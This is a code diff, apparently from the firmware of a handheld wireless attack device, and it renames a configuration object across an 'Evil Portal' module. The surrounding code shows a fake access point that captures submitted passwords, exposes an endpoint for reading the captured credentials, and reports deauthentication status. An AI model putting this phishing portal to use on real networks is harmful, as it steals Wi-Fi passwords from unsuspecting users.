@@ -28,11 +28,11 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     String url = request->url();
     if (url == "/") _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
-    else if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
-             bruceConfig.evilPortalEndpoints.allowGetCreds)
+    else if (url == wilyConfig.evilPortalEndpoints.getCredsEndpoint &&
+             wilyConfig.evilPortalEndpoints.allowGetCreds)
         request->send(200, "text/html", _portal->creds_GET());
-    else if (url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
-             bruceConfig.evilPortalEndpoints.allowSetSsid) {
+    else if (url == wilyConfig.evilPortalEndpoints.setSsidEndpoint &&
+             wilyConfig.evilPortalEndpoints.allowSetSsid) {
         if (request->hasArg("ssid")) {
             _portal->apName = request->arg("ssid").c_str();
             request->send(200, "text/html", _portal->ssid_POST());
@@ -66,14 +66,14 @@ bool EvilPortal::setup() {
     wsl_bypasser_send_raw_frame(&ap_record, _channel); // writes the buffer with the information
 
     if (apName == "") {
-        if (bruceConfig.evilWifiNames.empty()) {
+        if (wilyConfig.evilWifiNames.empty()) {
             apName_from_keyboard();
         } else {
             options = {
                 {"WiFi Personalizado", [this]() { apName_from_keyboard(); }}
             };
 
-            for (const auto &_wifi : bruceConfig.evilWifiNames) {
+            for (const auto &_wifi : wilyConfig.evilWifiNames) {
                 options.emplace_back(_wifi.c_str(), [this, _wifi]() { this->apName = _wifi; });
             }
 
@@ -150,15 +150,15 @@ void EvilPortal::setupRoutes() {
     // this must be done in the handleRequest() function too
     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
     webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
-    if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
+    if (wilyConfig.evilPortalEndpoints.allowGetCreds) {
         webServer.on(
-            bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
+            wilyConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
             [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
         );
     }
-    if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
+    if (wilyConfig.evilPortalEndpoints.allowSetSsid) {
         webServer.on(
-            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
+            wilyConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
                 if (request->hasArg("ssid")) {
                     apName = request->arg("ssid").c_str();
                     request->send(200, "text/html", ssid_POST());
@@ -241,14 +241,14 @@ void EvilPortal::drawScreen() {
 
     String apIp = WiFi.softAPIP().toString();
     padprintln("");
-    if (bruceConfig.evilPortalEndpoints.showEndpoints) {
-        if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint + " -> obter creds");
+    if (wilyConfig.evilPortalEndpoints.showEndpoints) {
+        if (wilyConfig.evilPortalEndpoints.allowGetCreds) {
+            padprintln("-> " + apIp + wilyConfig.evilPortalEndpoints.getCredsEndpoint + " -> obter creds");
         } else {
             padprintln("-> acesso a creds desabilitado");
         }
-        if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint + " -> definir ssid");
+        if (wilyConfig.evilPortalEndpoints.allowSetSsid) {
+            padprintln("-> " + apIp + wilyConfig.evilPortalEndpoints.setSsidEndpoint + " -> definir ssid");
         } else {
             padprintln("-> troca de SSID desabilitada");
         }
@@ -263,7 +263,7 @@ void EvilPortal::drawScreen() {
         padprint("Tentativas: " + String(totalCapturedCredentials));
     }
     String passMode = "";
-    switch (bruceConfig.evilPortalPasswordMode) {
+    switch (wilyConfig.evilPortalPasswordMode) {
         case FULL_PASSWORD: passMode = "Completa"; break;
         case FIRST_LAST_CHAR: passMode = "p******d"; break;
         case HIDE_PASSWORD: passMode = "*hidden*"; break;
@@ -294,7 +294,7 @@ void EvilPortal::printDeauthStatus() {
     } else {
         tft.setTextColor(TFT_RED);
         printFootnote("Deauth LIG");
-        tft.setTextColor(bruceConfig.priColor);
+        tft.setTextColor(wilyConfig.priColor);
     }
 }
 
@@ -428,7 +428,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
 
         if (key == "password") {
             char blank = '*';
-            switch (bruceConfig.evilPortalPasswordMode) {
+            switch (wilyConfig.evilPortalPasswordMode) {
                 case FULL_PASSWORD:
                     // do nothing, already have full password and want to save it
                     break;
@@ -474,8 +474,8 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             printDeauthStatus();
 
             // save to WiFi creds if the pwd was correct.
-            if (bruceConfig.getWifiPassword(apName) != "") {
-                bruceConfig.addWifiCredential(apName, passwordValue);
+            if (wilyConfig.getWifiPassword(apName) != "") {
+                wilyConfig.addWifiCredential(apName, passwordValue);
             }
             vTaskDelay(50 / portTICK_PERIOD_MS);
             // stop further actions...
@@ -515,7 +515,7 @@ String EvilPortal::creds_GET() {
 String EvilPortal::ssid_GET() {
     return getHtmlTemplate(
         "<p>Set a new SSID for Evil Portal:</p><form action='" +
-        bruceConfig.evilPortalEndpoints.setSsidEndpoint +
+        wilyConfig.evilPortalEndpoints.setSsidEndpoint +
         "' id='login-form'><input name='ssid' "
         "class='input-field' type='text' placeholder='" +
         apName + "' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>"
